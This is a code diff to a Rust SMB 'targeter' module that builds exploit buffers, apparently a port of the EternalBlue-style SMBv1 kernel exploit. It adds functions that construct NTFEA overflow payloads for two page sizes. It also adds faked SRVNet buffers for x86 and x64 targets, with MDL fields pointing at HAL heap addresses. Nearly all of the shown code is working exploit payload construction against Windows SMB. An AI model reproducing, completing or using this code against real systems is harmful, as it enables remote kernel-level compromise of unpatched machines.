@@ -3,6 +3,7 @@
 
 extern crate smbclient_sys as smb;
 extern crate libc;
+extern crate bytes;
 
 
 /// SMB-based functions, uses smbclient bindings
@@ -80,6 +81,7 @@ pub mod targeter {
     use std::net::Ipv4Addr;
     use std::net::TcpStream;
     use std::str::FromStr;
+    use bytes::{BytesMut, BufMut};
 
     use num::bigint::BigUint;
     use num::ToPrimitive;
@@ -138,28 +140,28 @@ pub mod targeter {
         }
 
         /// builds the exploitable buffer used for our offset/ntfea_size
-        fn build_ntfea11000() -> Vec<u8> {
-            let mut buff: Vec<u8> = Vec::with_capacity(
+        fn build_ntfea11000() -> BytesMut {
+            let mut buff = BytesMut::new(); /*Vec<u8> = Vec::with_capacity(
                                 600*5 // beginning zeroes (pack('<BBH',0,0,0)+'\x00')*600)
                                 + 4 // address offset presumably
                                 + 0xf3bd // space to fill up page with debug "we have gone too far" stuff
-                            );
+                            );*/
 
             // initialize with zeroes
             for _ in 0..600*5 {
-                buff.push(0); 
+                buff.put_u8(0); 
             }
 
             // put address and stuff in there
-            buff.push(0);
-            buff.push(0);
-            buff.push(0xbd); // NOTE TO SELF: IF IT BREAKS ITS PROBS BECAUSE THIS  
-            buff.push(0xf3); // IS NOT PERFECTLY LITTLE ENDIAN
+            buff.put_u8(0);
+            buff.put_u8(0);
+            buff.put_u8(0xbd); // NOTE TO SELF: IF IT BREAKS ITS PROBS BECAUSE THIS  
+            buff.put_u8(0xf3); // IS NOT PERFECTLY LITTLE ENDIAN
 
 
             // fill with 'A's for debugging/buffering
             for _ in 0..0xf3be {
-                buff.push('A' as u8);
+                buff.put_u8('A' as u8);
             }
 
             // return buffer
@@ -167,40 +169,119 @@ pub mod targeter {
         }
 
         /// builds ntfea buffer for 0x1f000 page size
-        fn build_ntfea1f000() -> Vec<u8> {
-            let mut buff: Vec<u8> = Vec::with_capacity(
+        fn build_ntfea1f000() -> BytesMut {
+            let mut buff = BytesMut::new();/* Vec<u8> = Vec::with_capacity(
                         0x2494*5 // beginning zeroes (pack('<BBH',0,0,0)+'\x00')*0x2494)
                         + 4 // address offset presumably
                         + 0x48ee // space to fill up page with debug "we have gone too far" stuff
-                    );
+                    );*/
                 
             // initialize with zeroes
             for _ in 0..0x2494*5 {
-                buff.push(0); 
+                buff.put_u8(0); 
             }
 
             // put address and stuff in there
-            buff.push(0);
-            buff.push(0);
-            buff.push(0xed); // NOTE TO SELF: IF IT BREAKS ITS PROBS BECAUSE THIS  
-            buff.push(0x48); // IS NOT PERFECTLY LITTLE ENDIAN
+            buff.put_u8(0);
+            buff.put_u8(0);
+            buff.put_u8(0xed); // NOTE TO SELF: IF IT BREAKS ITS PROBS BECAUSE THIS  
+            buff.put_u8(0x48); // IS NOT PERFECTLY LITTLE ENDIAN
 
 
             // fill with 'A's for debugging/buffering
             for _ in 0..0x48ee {
-                buff.push('A' as u8);
+                buff.put_u8('A' as u8);
             }
 
             // return buffer
             buff
         }
 
-        /// builds the faked SRVNet Buffer
-        fn build_srvnetbuff() -> Vec<u8> {
-            let mut buff: Vec<u8> = Vec::with_capacity(1);
+        /// builds the faked SRVNet Buffer for x86 targets
+        fn build_srvnetbuff_x86() -> BytesMut {
+            let mut tmp = BytesMut::new();
 
-            buff
+            // begin by prepping structure layout? (line 158)
+            for _ in 0..2 {
+                tmp.put_u32_le(0x11000);
+                tmp.put_u32_le(0x0);
+            }
+            // make sure structure is marked for full deletion
+            for _ in 0..2 {
+                tmp.put_u16_le(0xffff);
+                tmp.put_u16_le(0);
+            }
+            // buffering for next bits
+            for _ in 0..16{ tmp.put_u8(0); }
 
+            // start filling address pointers in internal struct
+            tmp.put_u32_le(TARGET_HAL_HEAP_ADDR_x86+0x100); // fills _________
+            tmp.put_u32_le(0);
+            tmp.put_u32_le(0);
+            tmp.put_u32_le(TARGET_HAL_HEAP_ADDR_x86+0x20); // fills __________ (end line 161)
+
+            tmp.put_u32_le(TARGET_HAL_HEAP_ADDR_x86+100);
+            tmp.put_u32_le(0); // fills x86 MDL.Next (offset?)
+            tmp.put_u16_le(0x60); // fills .Size
+            tmp.put_u16_le(0x1004); // fills .MdlFlags
+            tmp.put_u32_le(0); // fills .Process (end line 162)
+
+            tmp.put_u32_le(TARGET_HAL_HEAP_ADDR_x86+0x80); // fills x86 MDL.MappedSystemVa
+            tmp.put_u32_le(0);
+            tmp.put_u64_le(TARGET_HAL_HEAP_ADDR_x64); // ptr to fake structure (end line 163)
+
+            tmp.put_u64_le(TARGET_HAL_HEAP_ADDR_x64+0x100); // fills x64 pmd12 (what is this?)
+            tmp.put_u64_le(0); // end line 164
+
+            tmp.put_u64_le(0); // fills MDL.Next
+            tmp.put_u16_le(0x60); // fills MDL.Size
+            tmp.put_u16_le(0x1004); // fills MDL.MdlFlags
+            tmp.put_u32_le(0); // end line 167
+
+            tmp.put_u64_le(0); // fills MDL.Process
+            tmp.put_u64_le(TARGET_HAL_HEAP_ADDR_x64-0x80); // fills MDL.MappedSystemVa (end line 168)
+
+            // return the bytes
+            tmp
+        }
+
+
+        /// builds the faked SRVNet Buffer for x64 targets
+        fn build_srvnetbuff_x64() -> BytesMut {
+            let mut tmp = BytesMut::new();
+
+            // begin by prepping structure layout? (line 158)
+            for _ in 0..2 {
+                tmp.put_u32_le(0x11000);
+                tmp.put_u32_le(0x0);
+            }
+            // make sure structure is marked for full deletion
+            tmp.put_u16_le(0xffff);
+            tmp.put_u16_le(0);
+            tmp.put_u32_le(0);
+            tmp.put_u64_le(0);
+            
+            // buffering for next bits
+            for _ in 0..48{ tmp.put_u8(0); }
+
+            // start filling address pointers in internal struct
+            tmp.put_u32_le(0);
+            tmp.put_u32_le(0);
+            tmp.put_u64_le(TARGET_HAL_HEAP_ADDR_x64); // ptr to fake structure (end line 177)
+
+            tmp.put_u64_le(TARGET_HAL_HEAP_ADDR_x64+0x100); // fills x64 pmd12 (what is this?)
+            tmp.put_u64_le(0); // end line 178
+
+            tmp.put_u64_le(0); // fills MDL.Next
+            tmp.put_u16_le(0x60); // fills MDL.Size
+            tmp.put_u16_le(0x1004); // fills MDL.MdlFlags
+            tmp.put_u32_le(0); // end line 179
+
+            tmp.put_u64_le(0); // fills MDL.Process
+            tmp.put_u64_le(TARGET_HAL_HEAP_ADDR_x64-0x80); // fills MDL.MappedSystemVa (end line 180)
+
+            // return the bytes
+            tmp
         }
 
 
